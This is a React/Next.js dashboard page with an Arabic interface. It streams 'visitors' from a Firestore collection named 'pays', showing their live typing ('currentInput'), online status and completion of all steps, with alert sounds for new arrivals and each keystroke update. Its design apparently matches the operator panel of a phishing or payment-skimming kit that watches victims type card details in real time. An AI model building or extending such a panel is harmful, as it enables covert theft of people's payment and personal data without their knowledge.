"use client";

import { useState, useEffect, useRef } from "react";
import { collection, onSnapshot, query, orderBy } from "firebase/firestore";
import { db } from "@/lib/firebase";
import type { Visitor } from "@/lib/definitions";
import { DataTable } from "@/app/(dashboard)/orders/data-table";
import { columns } from "./columns";
import { AlertCircle, Eye, Users, Wifi } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";

function playNewVisitorSound() {
  if (typeof window === "undefined") return;
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = "sine";
    osc.frequency.setValueAtTime(440, ctx.currentTime);
    osc.frequency.setValueAtTime(550, ctx.currentTime + 0.08);
    osc.frequency.setValueAtTime(660, ctx.currentTime + 0.16);
    gain.gain.setValueAtTime(0.22, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.55);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.55);
  } catch {}
}

function playTypingUpdateSound() {
  if (typeof window === "undefined") return;
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = "sine";
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    gain.gain.setValueAtTime(0.06, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.1);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.1);
  } catch {}
}

export default function VisitorsPage() {
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [newVisitorId, setNewVisitorId] = useState<string | null>(null);
  const prevIdsRef = useRef<Set<string>>(new Set());
  const prevTypingRef = useRef<Map<string, string>>(new Map());
  const isFirstLoadRef = useRef(true);

  useEffect(() => {
    setError(null);
    let unsubscribe: () => void;

    try {
      const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
      unsubscribe = onSnapshot(
        q,
        (querySnapshot) => {
          const data: Visitor[] = [];
          querySnapshot.forEach((doc) => {
            data.push({ id: doc.id, ...doc.data() } as Visitor);
          });

          if (isFirstLoadRef.current) {
            isFirstLoadRef.current = false;
            data.forEach((v) => prevIdsRef.current.add(v.id));
          } else {
            // Detect new visitors
            data.forEach((v) => {
              if (!prevIdsRef.current.has(v.id)) {
                prevIdsRef.current.add(v.id);
                setNewVisitorId(v.id);
                playNewVisitorSound();
                setTimeout(() => setNewVisitorId(null), 3000);
              }
            });

            // Detect live typing updates (subtle tick sound)
            data.forEach((v) => {
              if (v.typing && v.currentInput) {
                const prev = prevTypingRef.current.get(v.id);
                if (prev !== v.currentInput) {
                  prevTypingRef.current.set(v.id, v.currentInput);
                  playTypingUpdateSound();
                }
              }
            });
          }

          setVisitors(data);
          setLoading(false);
        },
        (err) => {
          console.error("خطأ في قراءة بيانات الزوار:", err);
          setError("حدث خطأ أثناء تحميل البيانات. تأكد من صلاحيات Firebase.");
          setLoading(false);
        }
      );
    } catch (err) {
      console.error("خطأ في الاتصال بـ Firebase:", err);
      setError("فشل الاتصال بقاعدة البيانات.");
      setLoading(false);
    }

    return () => {
      if (unsubscribe) unsubscribe();
    };
  }, []);

  const onlineCount = visitors.filter((v) => v.online).length;
  const typingCount = visitors.filter((v) => v.typing && v.online).length;
  const completedCount = visitors.filter((v) => v.finalStatus === "completed").length;

  return (
    <div className="container mx-auto py-10" dir="rtl">
      <div className="flex items-center gap-3 mb-6">
        <Eye className="w-7 h-7 text-primary" />
        <h1 className="text-2xl font-bold">الزوار (من الموقع)</h1>
        <span className="text-sm text-muted-foreground">
          — البيانات مباشرة من Firebase بشكل فوري
        </span>
        {typingCount > 0 && (
          <span className="flex items-center gap-1 text-xs bg-amber-100 text-amber-700 border border-amber-300 rounded-full px-3 py-1 animate-pulse">
            <span className="w-1.5 h-1.5 rounded-full bg-amber-500 inline-block" />
            {typingCount} يكتب الآن
          </span>
        )}
      </div>

      {newVisitorId && (
        <div className="mb-4 flex items-center gap-3 rounded-lg border border-green-200 bg-green-50 px-4 py-3 text-green-700 animate-pulse">
          <Users className="h-5 w-5 flex-shrink-0" />
          <span className="text-sm font-medium">🎉 زائر جديد وصل للتو!</span>
        </div>
      )}

      {error && (
        <div className="mb-6 flex items-center gap-3 rounded-lg border border-red-200 bg-red-50 px-4 py-3 text-red-700">
          <AlertCircle className="h-5 w-5 flex-shrink-0" />
          <span className="text-sm">{error}</span>
        </div>
      )}

      <div className="grid gap-4 md:grid-cols-3 mb-6">
        <Card>
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium">إجمالي الزوار</CardTitle>
            <Users className="w-4 h-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{loading ? "—" : visitors.length}</div>
            <p className="text-xs text-muted-foreground mt-1">جميع الزوار المسجلين</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium">متصل الآن</CardTitle>
            <Wifi className="w-4 h-4 text-green-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-600">{loading ? "—" : onlineCount}</div>
            <p className="text-xs text-muted-foreground mt-1">
              {typingCount > 0 ? (
                <span className="text-amber-600 font-medium">{typingCount} يكتب الآن ✏️</span>
              ) : (
                "يتصفحون الموقع حالياً"
              )}
            </p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium">أكملوا العملية</CardTitle>
            <Eye className="w-4 h-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{loading ? "—" : completedCount}</div>
            <p className="text-xs text-muted-foreground mt-1">أتموا جميع الخطوات</p>
          </CardContent>
        </Card>
      </div>

      <DataTable columns={columns} data={visitors} isLoading={loading} />
    </div>
  );
}
